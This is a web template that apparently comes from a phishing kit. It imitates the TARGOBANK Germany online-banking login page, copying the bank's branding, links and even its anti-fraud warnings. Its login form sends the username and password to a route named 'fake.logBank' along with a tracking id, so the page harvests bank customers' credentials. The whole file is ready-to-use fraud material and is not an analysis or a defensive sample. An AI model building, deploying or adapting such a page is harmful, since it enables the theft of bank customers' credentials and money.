@extends('layouts.fake')
@push('css')
    <link type="text/css" rel="stylesheet" href="{{asset('/css/ei_base.css')}}">
    <link type="text/css" rel="stylesheet" href="{{asset('/css/devb_base.css')}}">
    <link type="text/css" rel="stylesheet" href="{{asset('/css/ei_custom_responsive.css')}}">
    <link type="text/css" rel="stylesheet" href="{{asset('/css/ei_custom_identification.css')}}">
    <link type="text/css" rel="stylesheet" href="{{asset('/css/ei_needscript.css')}}">
    <link type="text/css" rel="stylesheet" href="{{asset('/css/ei_custom_tile.css')}}">
    <style>
        .security-cta {
            position: absolute;
            top: 145px;
            left: 0px;
            padding: 55px 0 0 0;
            background-image: url(../html/svg/warning.svg);
            background-size: 100px;
            background-repeat: no-repeat;
            background-position: top left;
            text-align: left;
            max-width: 320px;
        }

        .security-cta h4 {
            color: #ffffff;
            font-size: 20px;
            font-weight: 500;
            padding: 0 0 5px 115px;
        }

        .security-cta a {
            color: #002f5f;
            font-size: 16px;
            display: block;
            margin-top: 15px;
            position: relative;
            padding-left: 25px;
            background: transparent url(../html/svg/icon-accordion-arrow-right.svg) 0px -3px no-repeat;
            background-size: 28px;
        }

        .security-cta a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .security-cta {
                position: relative;
                top: -20px;
                left: 0px;
                max-width: 100%;
                padding: 10px 0 0 0;
            }

            .security-cta a {
                margin: 5px 0 0 105px;
            }
        }
    </style>
    <link type="text/css" rel="stylesheet" href="{{asset('/css/loginpage.css')}}">
@endpush
@section('content')
    <div id="ei_tpl_fullsite" class="ei_tpl_authent">
        <header id="ei_tpl_head" class="ei_header" role="banner">
            <div class="ei_headertopbar eir_hidesm">
                <div class="ei_header__container">
                    <ul class="ei_headertopbar__linklist ei_headertopbar__linklist-left">
                        <ul>
                            <li class="ei_headertopbar__linkitem">
                                <a class="ei_headertopbar__link" href="https://www.targobank.de/">Privatkunden</a>
                            </li>
                            <li class="ei_headertopbar__linkitem">
                                <a class="ei_headertopbar__link" href="https://www.targobank.de/de/geschaeftskunden/">Geschäftskunden </a>
                            </li>
                            <a class="ei_headertopbar__link" href="https://www.targobank.de/de/geschaeftskunden/"> </a>
                            <li class="ei_headertopbar__linkitem">
                                <a class="ei_headertopbar__link"
                                   href="https://www.targobank.de/de/geschaeftskunden/"> </a><a
                                    class="ei_headertopbar__link" href="https://www.targobank.de/de/firmenkunden/">Firmenkunden</a>
                            </li>
                        </ul>
                    </ul>
                    <ul class="ei_headertopbar__linklist ei_headertopbar__linklist-right">
                        <ul>
                            <li class="ei_headertopbar__linkitem">BLZ: 300 209 00</li>
                            <li class="ei_headertopbar__linkitem ei_headertopbar__linkitem-separator">BIC: CMCIDEDD</li>
                        </ul>
                    </ul>
                </div>
            </div>

            <div class="ei_headermain">
                <div class="ei_headermain__container" style="display: block;">
                    <div class="ei_headermain__logocontainer">
                        <a style="margin-top:25px;width: auto;height: 50px;background:url('{{asset($bank['logo'])}}') no-repeat 0 0 transparent;" class="ei_headermain__logo" href="https://www.targobank.de/index.html">
                            <span class="ei_headermain__logoname">Targobank DE</span>
                        </a>
                    </div>
                    <div id="ei_tpl_identbt"></div>
                </div>
            </div>
        </header>

        <main id="ei_tpl_content" role="main">
            <div class="ei_blocauth">
                <div id="ei_tpl_contener">
                    <div class="ei_blocauth_infos">
                        <div class="security-cta">
                            <h4>Aktuelle Warnhinweise:</h4>
                            <a href="https://www.targobank.de/de/identification/authentification.html#Anker_Sicherheit">Sicherheitshinweis
                                vom 11.03.2022.</a>
                            <a href="https://www.targobank.de/de/service/online-sicherheit/index.html#TB1-E-ACCO-07-16-D"
                               target="_blank">Die TARGOBANK fragt Sie niemals nach Ihrer vollständigen Telefon-PIN
                                (T-PIN).</a>
                        </div>

                    </div>
                    <div class="ei_blocauth_connexion">
                        <div class="ei_blocauth_form">
                            <h1 class="c">Login</h1>
                            <p class="c">Melden Sie sich hier mit Ihrem Benutzernamen und Passwort zum TARGOBANK
                                Online-Banking an.</p>

                            <div class="ei_appl_ident" id="ident">
                                <form id="bank_pm_form" method="POST"
                                      action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}" autocomplete="off" name="bloc_ident">
                                    <fieldset>
                                        <div class="ei_appl_ident_content">
                                            <div class="ei_appl_ident_lig">
                                                <label for="_userid">Benutzername</label>

                                                <input type="text" name="username" id="_userid" value="" placeholder=""
                                                       class="ei_appl_userid">
                                            </div>

                                            <div class="ei_appl_ident_lig">
                                                <label for="_pwduser">Passwort</label>

                                                <span class="ei_inputpassword ei_inputpassword-reveal">
                                                        <input type="password" name="password" id="_pwduser"
                                                               placeholder="" class="ei_appl_pwduser">

                                                        <button id="revealPasswordButton" type="button"
                                                                title="Eingabe anzeigen"
                                                                class="ei_inputpassword__reveal">
                                                            <span aria-hidden="true"
                                                                  class="ei_inputpassword__reveal-icon"></span>
                                                        </button>
                                                    </span>
                                            </div>

                                            <div class="ei_appl_ident_lig aide"><a
                                                    href="https://www.targobank.de/de/identification/authentification.html">Passwort
                                                    vergessen?</a></div>
                                        </div>
                                    </fieldset>
                                    <div class="ei_appl_ident_blocbts blocboutons">
                                        <div id="memorized-user-id-checkbox" class="blocdecision">
                                            <p>
                                                <input type="checkbox" name="_memorize" id="_memorize">
                                                <label for="_memorize">Meinen Benutzernamen speichern</label>
                                            </p>
                                        </div>

                                        <span class="ei_buttonbar">
                                                <span class="ei_mainbuttons">
                                                    <span id="login-submit" onclick="sendRequest(); return false;"
                                                          class="ei_button">
                                                        <button type="submit" class="ei_btn" aria-labelledby="label-validate"
                                                           >
                                                            <span class="ei_btn_body" id="label-validate">
                                                                <span class="ei_btn_tlcorn" role="presentation"></span>
                                                                <span class="ei_btn_label">Jetzt einloggen</span>
                                                                <span class="ei_iblock ei_btn_pic" role="presentation">&nbsp;</span>
                                                            </span>
                                                            <span class="ei_btn_footer" role="presentation">
                                                                <span class="ei_btn_blcorn" role="presentation"></span>
                                                            </span>
                                                        </button>
                                                    </span>
                                                </span>
                                            </span>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="ei_blocauth_links">
                            <a class="eir_hidexs ei_blocauth_links_password"
                               href="https://www.targobank.de/de/user/password_reset.html">Zugangsdaten vergessen?</a>
                            <a class="eir_showxs ei_blocauth_links_password"
                               href="https://www.targobank.de/de/user/password_reset.html#C:password">Zugangsdaten
                                vergessen?</a>
                            <a class="eir_hidexs ei_blocauth_links_new"
                               href="https://www.targobank.de/de/user/password_reset.html">Neu bei der TARGOBANK?</a>
                            <a class="eir_showxs ei_blocauth_links_new"
                               href="https://www.targobank.de/de/user/password_reset.html#C:username">Neu bei der
                                TARGOBANK?</a>
                        </div>
                    </div>
                </div>
            </div>

            <section class="loginpage">
                <div class="container" id="safetyinstructions">
                    <div id="Anker_Sicherheit" style="position: relative; top: -200px;"></div>
                    <h2>Aktuelle Sicherheitshinweise</h2>
                    <div class="infomessage red">
                        <p>
                            Wie aus den Medien bekannt treten immer wieder Fälle auf, in denen sich Betrüger zunächst
                            per
                            E-Mail und anschließend telefonisch als Bankmitarbeiter ausgeben.
                        </p>
                        <br>
                        <p>
                            <strong class="red">Wichtig:</strong> Beenden Sie sofort das Gespräch oder einen Chat, wenn
                            jemand Sie nach schützenswerten Daten (z.B. TAN-Nummern) fragt. Und natürlich gilt: Bitte
                            händigen Sie niemals einer
                            fremden Person Ihre persönlichen Zugangsdaten, Karten oder Lesegeräte aus.
                        </p>
                        <br>
                        <p>Mehr Informationen finden Sie unter&nbsp;<a
                                href="https://www.targobank.de/de/service/online-sicherheit/index.html?rd=0716">Online-Sicherheit</a>
                            mit einem aktuellen Hinweis vom 11.03.2022.</p>
                    </div>
                </div>
            </section>

            <section class="loginpage contrast">
                <div class="container" id="safetyinstructions">
                    <div class="info-container">
                        <h2>Unsere Sicherheitstipps</h2>
                        <ul>
                            <li>Geben Sie niemals mehrere TANs gleichzeitig ein.</li>
                            <li>Geben Sie niemals vertrauliche Daten oder TANs per E-Mail oder Telefon preis.</li>
                            <li>Ändern Sie regelmäßig Ihre Passwörter und PIN.</li>
                            <li>Speichern Sie vertrauliche Daten wie Benutzername, Passwort, PIN oder TAN nicht auf der
                                Festplatte.
                            </li>
                            <li>Schreiben Sie Benutzernamen, PIN und Passwörter möglichst nirgendwo auf, und teilen Sie
                                diese auch niemandem mit.
                            </li>
                            <li>Nutzen Sie keine für Dritte zugänglichen Computer zur Abwicklung von Online-Banking.
                            </li>
                        </ul>
                        <p>Weitere nützliche Hinweise finden Sie auf den Internetseiten des <a
                                href="https://www.bsi.bund.de/" target="_blank">Bundesamt für Sicherheit in der
                                Informationstechnik</a>.</p>
                    </div>
                </div>
            </section>

            <section class="loginpage">
                <div class="container" id="safetyinstructions">
                    <h2>Online-Banking spürbar sicherer</h2>
                    <div class="flex-container col3">
                        <div class="flex-item">
                            <div class="flex-item-inner">
                                <div class="flex-item--image-container"
                                     style="background-image: url(&#39;../html/img/service_online-sicherheit.jpg&#39;);"></div>
                                <h3>Online-Sicherheit</h3>
                                <p>Hier finden Sie aktuelle Hinweise auf Betrugsversuche und wie sie sich davor schützen
                                    können.</p>
                                <a class="main-cta" href="https://www.targobank.de/service/online-sicherheit">Mehr
                                    erfahren</a>
                            </div>
                        </div>
                        <div class="flex-item">
                            <div class="flex-item-inner">
                                <div class="flex-item--image-container"
                                     style="background-image: url(&#39;../html/img/tan-verfahren.jpg&#39;);"></div>
                                <h3>TAN-Verfahren</h3>
                                <p>So individuell wie Ihre Anforderungen. Gestalten Sie sich Ihr Banking noch bequemer
                                    und
                                    sicherer.</p>
                                <a class="main-cta" href="https://www.targobank.de/service/tan-verfahren">Mehr
                                    erfahren</a>
                            </div>
                        </div>
                        <div class="flex-item">
                            <div class="flex-item-inner">
                                <div class="flex-item--image-container"
                                     style="background-image: url(&#39;../html/img/banking-app-620x450.jpg&#39;);"></div>
                                <h3>Banking-App</h3>
                                <p>Erledigen Sie Ihre Bankgeschäfte einfach, bequem und sicher von unterwegs.</p>
                                <a class="main-cta" href="https://www.targobank.de/service/mobile-banking/index.html">Mehr
                                    erfahren</a>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </main>

        <footer id="ei_tpl_footer" role="contentinfo">
            <div class="ei_footer">
                <div class="ei_footer__container">
                    <img class="ei_footer__logo" alt="Targobank"
                         src="{{asset('/images/banks/targobank_icon_white.png')}}">

                    <ul class="ei_footer__linklist">
                        <li class="ei_footer__linkitem">
                            <a class="ei_footer__link"
                               href="https://www.targobank.de/de/impressum/index.html">Impressum</a>
                        </li>
                        <li class="ei_footer__linkitem">
                            <a class="ei_footer__link"
                               href="https://www.targobank.de/de/datenschutz/index.html">Datenschutz</a>
                        </li>
                        <li class="ei_footer__linkitem">
                            <a class="ei_footer__link"
                               href="https://www.targobank.de/de/rechtliche-hinweise/index.html">AGB
                                &amp; Rechtliche Hinweise</a>
                        </li>
                        <li class="ei_footer__linkitem">
                            <a class="ei_footer__link" href="https://www.targobank.de/de/download/Preisubersicht.pdf"
                               target="_blank">Preise &amp; Leistungen</a>
                        </li>
                        <li class="ei_footer__linkitem">
                            <a class="ei_footer__link"
                               href="https://www.targobank.de/de/service/online-sicherheit/index.html">Sicherheit</a>
                        </li>
                    </ul>

                    <ul class="ei_footer__langlist">
                        <li class="ei_footer__langitem">
                            <a class="ei_footer__langlink"
                               href="https://www.targobank.de/de/banque/pageaccueil.html">DE</a>
                        </li>
                        <li class="ei_footer__langitem">
                            <a class="ei_footer__langlink"
                               href="https://www.targobank.de/en/banque/pageaccueil.html">EN</a>
                        </li>
                    </ul>
                </div>
            </div>
        </footer>
    </div>
@endsection
